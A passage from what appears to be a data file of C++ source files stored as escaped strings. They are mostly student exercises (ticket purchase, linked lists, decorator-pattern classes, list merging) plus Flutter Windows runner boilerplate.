jumlah;\r\n            cout << \"Masukkan jumlah tiket untuk \" << daftarFilm[pilihan-1].judul << \": \";\r\n            cin >> jumlah;\r\n            beliFilm[pilihan-1] += jumlah;\r\n        } else if (pilihan != 0) {\r\n            cout << \"Nomor film tidak valid. Silahkan coba lagi.\" << endl;\r\n        }\r\n    } while (pilihan != 0);\r\n\r\n    // Menghitung total harga tiket film\r\n    int totalHargaFilm = hitungTotalHargaFilm(daftarFilm, JUMLAH_FILM, beliFilm);\r\n\r\n    // Meminta pengguna untuk memberikan uang\r\n    int uang;\r\n    cout <<\"\\nTotal harga tiket film: Rp\" << totalHargaFilm << endl;\r\n    do {\r\n        cout << \"Masukkan uang Anda: Rp\";\r\n        cin >> uang;\r\n        if (uang < totalHargaFilm) {\r\n            cout << \"Uang Anda kurang. Silahkan masukkan uang yang cukup.\";\r\n        }\r\n    } while (uang < totalHargaFilm);\r\n\r\n    // Menghitung kembalian\r\n    int kembalian = uang - totalHargaFilm;\r\n    cout << \"Kembalian Anda: Rp\" << kembalian << endl;\r\n\r\n    return 0;\r\n}",
    "// ConsoleApplication6.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream> \nusing namespace std;    \n    \nclass Character abstract    \n{\nprotected:\n    string name;    \n    int attack;\n    int speed;\n    int health;\n    int defense;\npublic:\n    Character(string n, int att, int sp, int hlt, int def)           \n    {\n        name = n;   \n        attack = att;    \n        speed = sp;        \n        health = hlt; \n        defense = def;  \n    }   \n    string GetName() \n    {\n        return name;    \n    }\n    int GetAttack()\n    {\n        return attack;  \n    }\n    int GetSpeed()\n    {\n        return speed;\n    }\n    int GetHealth()\n    {\n        return health;\n    }\n    int GetDefense()\n    {\n        return defense; \n    }\n    virtual int Attack() abstract;\n    virtual int Speed() abstract;\n    virtual int Health() abstract;\n    virtual int Defense() abstract; \n};\n\nclass Human : public Character\n{\npublic:\n    Human(): Character(\"Human\", 20, 20, 150, 0)         \n    {}\n    int Attack() override\n    {\n        return 20;\n    }\n    int Speed() override\n    {\n        return 20;\n    }\n    int Health() override\n    {\n        return 150;\n    }\n    int Defense() override\n    {\n        return 1;   \n    }\n};\n\nclass Elf : public Character\n{\npublic: \n    Elf(): Character(\"Elf\", 15, 30, 100, 0) \n    {}\n    int Attack() override\n    {\n        return 15;\n    }\n    int Speed() override\n    {\n        return 30;\n    }\n    int Health() override\n    {\n        return 100;\n    }\n    int Defense() override\n    {\n        return 1;\n    }\n};\n\nclass HumanDericator abstract: public Character\n{\nprotected:\n    Character* character;\npublic: \n    HumanDericator(string n, int att, int sp, int hlt, int def, Character* character): Character(n, att, sp, hlt, def)    \n    {\n        this->character = character;\n    }\n};\n\nclass HumanWarrior : public HumanDericator\n{\npublic:\n    HumanWarrior(Character* ptr) : HumanDericator(ptr->GetName() + \": warrior\", ptr->GetAttack() +20, \n        ptr->GetSpeed() +10, ptr->GetHealth() +50, ptr->GetDefense() + 20, ptr) {}     \n    int Attack() \n    {\n        return character->GetAttack(); \n    }\n    int Speed() \n    {\n        return character->GetSpeed();\n    }\n    int Health()\n    {\n        return character->GetHealth();\n    }\n    int Defense() \n    {\n        return character->GetDefense();\n    }\n};\n\nclass HumanSwordtail : public HumanDericator\n{\npublic:\n    HumanSwordtail(Character* ptr) : HumanDericator(ptr->GetName() + \": swordtail\", ptr->GetAttack() + 40, \n        ptr->GetSpeed() - 10, ptr->GetHealth() + 50, ptr->GetDefense() + 40, ptr) {}     \n    int Attack() \n    {\n        return character->GetAttack();   \n    }\n    int Speed()\n    {\n        return character->GetSpeed();\n    }\n    int Health()\n    {\n        return character->GetHealth();\n    }\n    int Defense()\n    {\n        return character->GetDefense();    \n    }\n};\n\nclass HumanArcher : public HumanDericator\n{\npublic:\n    HumanArcher(Character* ptr) : HumanDericator(ptr->GetName() + \": Archer\", ptr->GetAttack() + 20,\n        ptr->GetSpeed() + 20, ptr->GetHealth() + 50, ptr->GetDefense() + 10, ptr) {}    \n    int Attack()\n    {\n        return character->GetAttack();\n    }\n    int Speed()\n    {\n        return character->GetSpeed();\n    }\n    int Health()\n    {\n        return character->GetHealth();\n    }\n    int Defense()\n    {\n        return character->GetDefense();\n    }\n};\n\nclass HumanRider : public HumanDericator\n{\npublic:\n    HumanRider(Character* ptr) : HumanDericator(ptr->GetName() + \": Rider\", ptr->GetAttack() - 10,\n        ptr->GetSpeed() + 40, ptr->GetHealth() + 200, ptr->GetDefense() + 100, ptr) {}    \n    int Attack()\n    {\n        return character->GetAttack();\n    }\n    int Speed()\n    {\n        return character->GetSpeed();\n    }\n    int Health()\n    {\n        return character->GetHealth();\n    }\n    int Defense()\n    {\n        return character->GetDefense();\n    }\n};\n\nclass ElfDericator abstract : public Character        \n{\nprotected:\n    Character* character;    \npublic:\n    ElfDericator(string n, int att, int sp, int hlt, int def, Character* character) : Character(n, att, sp, hlt, def)\n    {\n        this->character = character;    \n    }\n};\n\nclass ElfWarrior : public ElfDericator\n{\npublic:\n    ElfWarrior(Character* ptr) : ElfDericator(ptr->GetName() + \": Warrior\", ptr->GetAttack() + 20,\n        ptr->GetSpeed() - 10, ptr->GetHealth() + 100, ptr->GetDefense() + 20, ptr) {}\n    int Attack()\n    {\n        return character->GetAttack();\n    }\n    int Speed()\n    {\n        return character->GetSpeed();\n    }\n    int Health()\n    {\n        return character->GetHealth();\n    }\n    int Defense()\n    {\n        return character->GetDefense();\n    }\n};\n\nclass ElfMagician : public ElfDericator\n{\npublic:\n    ElfMagician(Character* ptr) : ElfDericator(ptr->GetName() + \": Magician\", ptr->GetAttack() + 10,    \n        ptr->GetSpeed() + 10, ptr->GetHealth() - 50, ptr->GetDefense() + 10, ptr) {}   ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <string.h> // C+\nusing namespace std;\n\nstruct emp {\n    int id;\n    char name[10];\n};\n\nstruct node {\n    emp data;\n    node *next;\n    node *prev;\n};\n\nclass LinkedL {\n    node *head;\n    node *tail;\n\n    node* PrivSearch_by_id(int id) {\n        node* temp = head;\n        while (temp != NULL) {\n            if (temp->data.id == id)\n                return temp;\n            temp = temp->next;\n        }\n        return NULL;\n    }\n\npublic:\n    LinkedL() { head = tail = NULL; }\n\n    void append(int id, char* name) {\n        node* temp = new node();\n        temp->data.id = id;\n        strcpy(temp->data.name, name);\n        temp->prev = NULL;\n        temp->next = NULL;\n\n        if (head == NULL) {\n            head = tail = temp;\n        } else {\n            temp->prev = tail;\n            tail->next = temp;\n            tail = temp;\n        }\n    }\n\n    void display() {\n        node* temp = head;\n        while (temp != NULL) {\n            cout << temp->data.id << \" \" << temp->data.name << endl;\n            temp = temp->next;\n        }\n    }\n\n    emp PubSearch_By_id(int id) {\n        node* temp = PrivSearch_by_id(id);\n        if (temp != NULL) {\n            return temp->data;\n        } else {\n            emp n;\n            n.id = -1;\n            strcpy(n.name, \"\");\n            return n;\n        }\n    }\n\n    int Count() {\n        int n = 0;\n        node* temp = head;\n        while (temp != NULL) {\n            n++;\n            temp = temp->next;\n        }\n        return n;\n    }\n\n    void delete_By_Id(int id) {\n        node* t = PrivSearch_by_id(id);\n        if (t == NULL)\n            return;\n\n        if (head == tail) {\n            head = tail = NULL;\n        } else if (t == head) {\n            head = head->next;\n            head->prev = NULL;\n        } else if (t == tail) {\n            tail = tail->prev;\n            tail->next = NULL;\n        } else {\n            t->prev->next = t->next;\n            t->next->prev = t->prev;\n        }\n        delete t;\n    }\n\n    void Insert_After_Id(int afterId, int newId, char* name) {\n    if (head == NULL) {\n\n        append(newId, name);\n        return;\n    }\n\n    node* current = head;\n    while (current != NULL && current->data.id != afterId) {\n        current = current->next;\n    }\n\n    if (current == NULL) {\n        cout << \"ID \" << afterId << \" not found. Insertion aborted.\" << endl;\n        return;\n    }\n\n    node* temp = new node();\n    temp->data.id = newId;\n    strcpy(temp->data.name, name);\n\n\n    temp->next = current->next;\n    temp->prev = current;\n    if (current->next != NULL) {\n        current->next->prev = temp;\n    } else {\n        tail = temp;\n    }\n    current->next = temp;\n}\n\n\n};\n\nint main() {\n    LinkedL ll;\n    ll.append(1, \"Yara\");\n    ll.append(2, \"Mohamed\");\n\n    cout << \"Displaying List Before Deletion:\" << endl;\n    ll.display();\n\n    cout << \".............................\" << endl;\n\n\n    cout << \"Deleting ID\" << endl;\n    ll.delete_By_Id(1);\n\n    cout << \"Displaying List After Deletion:\" << endl;\n    ll.display();\n\n    cout << \".............................\" << endl;\n\n     cout << \"Inserting new node after ID 2...\" << endl;\n    ll.Insert_After_Id(2, 3, \"Buthina\");\n\n    cout << \".............................\" << endl;\n    cout << \"Displaying List After Insertion:\" << endl;\n    ll.display();\n\n    return 0;\n};\n",
    "\ufeff#include <iostream>\n#include <windows.h>\n#include <string>\nusing namespace std;\n\nclass Pogona_vitticeps {\npublic:\n    string animal_class;\n    string suborder;\n    string family;\n    string body_length;\n\n    void Swim(string temperature) {\n        cout << \"Heat the bath to \" << temperature << \"\\n\";\n    }\n\n    void Eat(string insect) {\n        cout << \"Catch the \" << insect << \"\\n\";\n    }\n\n    void Gestures(string head_bob) {\n        cout << \"Violent bob \" << head_bob << \"\\n\";\n    }\n};\n\nclass Hospital {\npublic:\n    string H_name;\n    string location;\n    int available_beds;\n    double rating;\n\n    void Doctors_appointment(string doctor) {\n        cout << \"Choose a doctor: \" << doctor << \"\\n\";\n    }\n\n    void Examinations(string exam) {\n        cout << \"Choose an examination: \" << exam << \"\\n\";\n    }\n\n    void Registry(string reg) {\n        cout << \"Call the reception: \" << reg << \"\\n\";\n        Sleep(1000);\n        cout << \"...subscriber is temporary unavailable, please call later...\\n\";\n        Sleep(1000);\n    }\n};\n\nclass Date {\npublic:\n    int m_day; \n    int m_month; \n    int m_year;\n\n    void setDate(int day, int month, int year) \n    {\n        m_day = day;\n        m_month = month;\n        m_year = year;\n        cout << m_day << \".\" << m_month << \".\" << m_year << \"\\n\";\n    }\n};\n\nclass Hand {\npublic:\n    string bones;\n    string muscles;\n    string nerves;\n    string vessels;\n    int num_fingers;\n    \n    void Grab(string things) {\n        cout << \"I want grab \" << things << \"\\n\";\n    }\n\n    void Beat(string things) {\n        cout << \"I want beat \" << things << \"\\n\";\n    }\n\n    void Work(string things) {\n        cout << \"I work with \" << things << \"\\n\";\n    }\n};\n\nclass Book {\npublic:\n    string name;\n    int pages;\n    double weight;\n\n    void AboutBook() {\n        cout << \"Book \" << name << \" contains \" << pages << \" pages. \" << \"\\n\";\n        cout << \"Book takes \" << weight << \" mb.\" << \"\\n\";\n    }\n};\n\nint main() {\n\n    Pogona_vitticeps lizard;\n\n    lizard.animal_class = \"Reptilia\";\n    lizard.suborder = \"Iguania\";\n    lizard.family = \"Agamidae\";\n    lizard.body_length = \"25 sm\";\n    lizard.Swim(\"30-35 \u00b0C\");\n    lizard.Eat(\"zoophobus\");\n    lizard.Gestures(\"used by males just before mating\");\n\n    Hospital h;\n\n    h.H_name = \"Raylight\";\n    h.location = \"Ukraine\";\n    h.available_beds = 10;\n    h.Doctors_appointment(\"Pilulkin\");\n    h.Examinations(\"X-ray of the cervical spine\");\n    h.Registry(\"+380955289873\");\n\n    Date date;\n    date.setDate(2, 4, 2024); \n\n    Hand hnd;\n\n    hnd.bones = \"Carpals, Metacarpals, Phalanges\";\n    hnd.muscles = \"Thenar group, Hypothenar group, Metacarpal group\";\n    hnd.nerves = \"Median nerve, Radial nerve, Ulnar nerve\";\n    hnd.vessels = \"Arteries and Veins\";\n    hnd.num_fingers = 5;\n    hnd.Grab(\"nose\");\n    hnd.Beat(\"nose\");\n    hnd.Work(\"nose\");\n\n    Book book;\n\n    book.name = \"War and Peace\";\n    book.pages = 1300;\n    book.weight = 6.4;\n    book.AboutBook();\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <string>\n#include <utility>\n\nclass Text {\npublic:\n    virtual void render(const std::string& data) const {\n        std::cout << data;\n    }\n};\n\n\nclass DecoratedText : public Text {\npublic:\n    explicit DecoratedText(Text* text) : text_(text) {}\n    Text* text_;\n};\n\n//\u00ef\u00e0\u00f0\u00e0\u00e3\u00f0\u00e0\u00f4\nclass Paragraph : public DecoratedText {\npublic:\n    explicit Paragraph(Text* text) : DecoratedText(text) {};\n    void render(const std::string& data) const override {\n        std::cout << \"<p>\";\n        text_->render(data);\n        std::cout << \"</p>\";\n    }\n};\n//\u00f0\u00e5\u00e2\u00e5\u00f0\u00f1 \nclass Reversed : public DecoratedText {\npublic:\n    explicit Reversed(Text* text) : DecoratedText(text) {};\n    void render(const std::string& data) const override {\n        auto buf = data;\n        std::reverse(buf.begin(), buf.end());\n        text_->render(buf);\n    }\n};\n\n//\u00f1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00e5 \u00f1\u00f1\u00fb\u00eb\u00ea\u00e8\nclass Link : public DecoratedText {\npublic:\n    explicit Link(Text* text) :DecoratedText(text) {}\n    void render(const std::string& data) = delete;\n    void render(const std::string& link, const std::string& data) const{\n        std::cout << \"<a href=\" + link + \">\";\n        text_->render(data);\n        std::cout << \"</a>\";\n    }\n};\nint main() {\n    auto text_block = new Link(new Reversed (new Paragraph(new DecoratedText(new Text()))));\n    text_block->render(\"netology.ru\", \"Hello_world\");\n   // text_block->render(\"Hello_world!\");\n\n\n\n\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include<vector>\r\n#include<map>\r\n#include<iostream>\r\n\r\nstruct ListNode {\r\n\tint val;\r\n\tListNode *next;\r\n\tListNode() :val(0), next(nullptr) {}\r\n\tListNode(int x) :val(x), next(nullptr) {}\r\n\tListNode(int x, ListNode *next) :val(x), next(next) {}\r\n};\r\n\r\nclass Solution {\r\npublic:\r\n\r\npublic:\r\n\tListNode* mergeTwoLists(ListNode* list1, ListNode* list2) {\r\n\t\tstd::vector<int> vList1;\r\n\t\tstd::vector<int> vList2;\r\n\t\tstd::vector<int> vBool;// List1->0, List2->1\r\n\r\n\t\tListNode* listTmp1 = list1;\r\n\t\twhile (listTmp1)\r\n\t\t{\r\n\t\t\tvList1.push_back(listTmp1->val);\r\n\t\t\tlistTmp1 = listTmp1->next;\r\n\t\t}\r\n\r\n\t\tListNode* listTmp2 = list2;\r\n\t\twhile (listTmp2)\r\n\t\t{\r\n\t\t\tvList2.push_back(listTmp2->val);\r\n\t\t\tlistTmp2 = listTmp2->next;\r\n\t\t}\r\n\r\n\t\twhile (!vList1.empty() || !vList2.empty())\r\n\t\t{\r\n\t\t\tif (!vList1.empty() && !vList2.empty())\r\n\t\t\t{\r\n\t\t\t\tif (vList1[0] > vList2[0])\r\n\t\t\t\t{\r\n\t\t\t\t\tvList2.erase(vList2.begin());\r\n\t\t\t\t\tvBool.push_back(0);\r\n\t\t\t\t}\r\n\t\t\t\telse if (vList1[0] == vList2[0])\r\n\t\t\t\t{\r\n\t\t\t\t\tvList1.erase(vList1.begin());\r\n\t\t\t\t\tvList2.erase(vList2.begin());\r\n\t\t\t\t\tvBool.push_back(0);\r\n\t\t\t\t\tvBool.push_back(1);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tvList1.erase(vList1.begin());\r\n\t\t\t\t\tvBool.push_back(1);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse if (vList1.empty())\r\n\t\t\t{\r\n\t\t\t\tvList2.erase(vList2.begin());\r\n\t\t\t\tvBool.push_back(0);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tvList1.erase(vList1.begin());\r\n\t\t\t\tvBool.push_back(1);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tListNode* ListDummy = new ListNode(0, nullptr);\r\n\t\tListNode* ListRes = ListDummy;\r\n\t\tfor (int n = 0; n < vBool.size(); n++)\r\n\t\t{\r\n\t\t\tif (vBool[n])\r\n\t\t\t{\r\n\t\t\t\tListDummy->next = list1;\r\n\t\t\t\tListDummy = ListDummy->next;\r\n\t\t\t\tlist1 = list1->next;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tListDummy->next = list2;\r\n\t\t\t\tListDummy = ListDummy->next;\r\n\t\t\t\tlist2 = list2->next;\r\n\t\t\t}\r\n\t\t}\r\n\t\t//ListNode* listRes = new ListNode(0, ListDummy);\r\n\t\treturn ListRes->next;\r\n\t}\r\n};\r\n\r\nint main()\r\n{\r\n\t//ListNode* list1 = new ListNode(1, nullptr);\r\n\t//list1->next = new ListNode(2);\r\n\t//list1->next->next = new ListNode(4);\r\n\r\n\t//ListNode* list2 = new ListNode(1);\r\n\t//list2->next = new ListNode(3);\r\n\t//list2->next->next = new ListNode(4);\r\n\r\n\tListNode* list1 = new ListNode();\r\n\tlist1 = nullptr;\r\n\tListNode* list2 = new ListNode(0, nullptr);\r\n\tSolution sol;\r\n\tListNode* listRes =  sol.mergeTwoLists(list1, list2);\r\n\tstd::cout << \"show listRes: \" << std::endl;\r\n\twhile (listRes)\r\n\t{\r\n\t\tstd::cout << listRes->val << std::endl;\r\n\t\tlistRes = listRes->next;\r\n\t}\r\n\treturn 0;\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const 